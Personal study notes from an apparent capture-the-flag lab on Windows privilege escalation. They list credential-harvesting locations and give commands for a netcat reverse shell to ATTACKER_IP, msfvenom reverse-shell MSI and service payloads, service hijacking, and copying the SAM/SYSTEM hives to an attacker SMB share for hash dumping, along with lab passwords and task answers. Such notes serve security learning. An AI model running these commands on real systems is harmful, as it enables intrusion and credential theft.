"Windows Privilege Escalation:"
    * Def:  [Access to User A, leverage vulnerability to get acces to User B, escalate to admin privs]
    
    * Some common weaknesses include:
    [
            
        Misconfigurations on Windows services or scheduled tasks
        Excessive privileges assigned to our account
        Vulnerable software
        Missing Windows security patches

    ]

    "Windows Users"
        Administrators	        These users have the most privileges. They can change any system configuration parameter and access 
                                any file in the system.
        Standard Users	        These users can access the computer but only perform limited tasks. Typically these users 
                                can not make permanent or essential changes to the system and are limited to their files.

        SYSTEM / LocalSystem    An account used by the operating system to perform internal tasks. It has full access 
                                to all files and resources available on the host with even higher privileges than administrators.

        Local Service           Default account used to run Windows services with "minimum" privileges. 
                                It will use anonymous connections over the network.

        Network Service         Default account used to run Windows services with "minimum" privileges. 
                                It will use the computer credentials to authenticate through the network.


    "TASK 2 | Harvesting Passwords from usual spots"
        RDP LOGIN:
            [User: thm-unpriv            Password: Password321]

        * [xfreerdp3 /v:10.10.5.28 /u:thm-unpriv /p:Password321]        Connected via Remote Desktop Protocol

        "UNATTENDED WINDOWS INSTALLATIONS:"
            * When installing windows on a large number of hosts, admin may use Windows Deployment Services.
            * A single OS image deployed on several hosts in the network.
            * These require that the admin performs initial setup. This (may be) stored in: (Hoping to find creds)
                [
                    C:\Unattend.xml
                    C:\Windows\Panther\Unattend.xml
                    C:\Windows\Panther\Unattend\Unattend.xml
                    C:\Windows\system32\sysprep.inf
                    C:\Windows\system32\sysprep\sysprep.xml
                ]

        "POWERSHELL HISTORY"
            * Previous commands stored as history for QOL. Say someone used a powershell command with a password included.

            [type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt]
                    Ran in cmd, gives powershell history.


        "SAVED WINDOWS CREDENTIALS"
            * Windows allows use of other users' credentials. Done using:
            [cmdkey /list]                              Notice credentials worth trying. Then, use them with the following:
            [runas /savecred /user:admin cmd.exe]       Replace Admin


        "IIS CONFIGURATION"
            * Internet Information Services is the default web server on Windows installations. 
            * Stores website configurations in web.config
                [
                C:\inetpub\wwwroot\web.config
                C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
                ]
                [type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString]     Command to find


        "RECEIVE CREDENTIALS FROM SOFTWARE... PUTTY!"
            * PuTTY is an SSH client found on Windows.
            * Instead of specifying connection parameters every time, PuTTY stores session configuration info.
            * These configs include proxy configurations, storing cleartext authentication credentials.

            * To retrieve proxy credentials:
                [reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s]

            ** PuTTY stores credentials, other software could store passwords, (browser, email clients, FTP clients, SSH clients, etc.).



            ** Accessing target:
            [xfreerdp3 /v:10.10.4.163 /u:thm-unpriv /p:Password321]

    "TASK 3 | Harvesting Passwords"

        Questions:
        Answer 1:       [ZuperCkretPa5z]
        Answer 2:       [098n0x35skjD3]
        Answer 3:       [THM{WHAT_IS_MY_PASSWORD}]
        Answer 4:       [CoolPass2021]



    "TASK 4 | Other Quick Wins"

        * "Scheduled Tasks:"
            * We may be able to see a scheduled task that is missing a binary/ binary is modifiable.
            * [schtasks]                                            List scheduled tasks.
            * [schtasks /query /tn vulntask /fo list /v]            
            * "Task to Run" parameter which indicates what gets executed by the scheduled task
            * "Run As User" parameter shows the user that will execute the task.
            * [icacls FILE_PATH]                                    File permissions
            Example:        BUILTIN\Users:(I)(F)                    Shows (F)ull access over the task's binary.
            

        * "Changing .bat file to spawn reverse shell"
                [echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat]
                [nc -lvp 4444]                          Start a listener on the attacking machine

        * "AlwaysInstallElevated"           [xfreerdp3 /v:10.10.178.197 /u:thm-unpriv /p:Password321]
            * Windows installer files (.msi) are used to install applciations on the system.
            * These can be configured to run with higher privileges from any user!
            * Potential to write a malicious .msi file that is run with admin privileges.

            The following two registry values must be set. Check with:
            [reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer]
            [reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer]
            
            Then generate a malicious .msi file using msfvenom:
            [msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi]
            * As this is a reverse shell, need to run the Metasploit Handler module.
            * Once the file has been transferred, we can run the installer and receive the shell with the command:
            [msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi]


        "TASK 5 | Abusing Service Misconfigurations"        xfreerdp3 /v:10.10.36.137 /u:thm-unpriv /p:Password321
            * Services are managed by Service Control Manager (SCM). Process in charge of managing state of services as needed.
            * Each service has an associated executable, ran every time the SCM whenever a service is started.
            * Executables implement special functions to communicate with SCM. Hence, not always possible to successfully start service.
            * Each service also specifies the user under which the service is ran.
            [sc qc apphostsvc]
            

            * Discretionary Access Control List (DACL), indicates who has permission to start, stop, pause, query status, etc.
            * Service configurations stored in [HKLM\SYSTEM\CurrentControlSet\Services\]

            ImagePath | Associated Executable
            ObjectName | User info
            Security | If DACL configured, subkey stored here.

            "Insecure Permissions on Service Executable"
                * If executable has weak permissions, allowing attacker to modify or replace it, attacker can gain privileges of service trivially.
                [sc qc WindowsScheduler]                    Query service configuration
                [icacls C:\PROGRA~2\SYSTEM~1\WService.exe]  Check permissions of executable
                [(M)]                                       This means a group has MODIFY PERMISSIONS

                "Example: EXE service payload using MSFVENOM"
                    [msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe]       On attacker machine
                    [python3 -m http.server]                        

                    "wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe"                       Pull payload from attacking machine (on target)
                    [cd C:\PROGRA~2\SYSTEM~1\]                                                      
                    [move WService.exe WService.exe.bkp]
                    [move C:\Users\thm-unpriv\rev-svc.exe WService.exe]
                    [icacls WService.exe /grant Everyone:F]

                            

                        Questions:
                        Answer 1:           []     
                        Answer 2:           []     
                        Answer 3:           []     
                        Answer 4:           []     

            "Insecure Service Permissions:"

            DACL:   "Discretionary Access Control List"

            On Target Machine:    
                [accesschk64.exe -qlc thmservice]                   The command to check for the thmservice service DACL
                ...do the below attackbox steps
                [icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F]         Change permissions
                [sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem]         Change services associated executable and account
                [sc stop THMService]
                [sc start THMService]



            On Attacking Machine:
            [msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe]     Payload
            [nc -lvp 4447]
            ... Target steps above
            [whoami]



            "TASK 6 | Abusing Dangerous Privileges"
                * Privileges are rights an account has to perform specific system-related tasks.
                [whoami /priv]                              Checks privileges.
                "https://github.com/gtworek/Priv2Admin"     List of exploitable privileges.
                
                "SeBackup / SeRestore"
                    * Allows user to read and write to any file in the system, regardless of DACL in place.
                    * Allows certain users to perform backups from a system without having Admin privs.
                    * This capability allows attacker to trivially escalate privileges by a number of methods. 
                    -> "Copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash"

                Challenge Steps:
                [10.10.111.163]                                                      Target
                [xfreerdp3 /v:10.10.111.163 /u:THMBackup /p:CopyMaster555]           Connect to target using RDP
                Open CMD as administrator
                [whoami /priv]                                          Check privileges

                BACKUP THE SAM & SYSTEM HASHES:
                [reg save hklm\system C:\Users\THMBackup\system.hive]
                [reg save hklm\sam C:\Users\THMBackup\sam.hive]             Creates a number of files with the registry hives content.

                "Now we need to copy these files to the attacking machine. 
                Easy SMB, using impacket's smbserver.py to start a simple SMB server with a network share in our attack box CURRENT DIRECTORY!"

                ON ATTACKING MACHINE:
                [mkdir share]
                [python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share]
                Creates a share named 'public', points to the 'share' folder.

                ON TARGET: Transfer files to attackbox
                [copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\]
                [copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\]

                ON ATTACKING MACHINE: Use impacket to retrieve the users' password hashes
                [python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL]


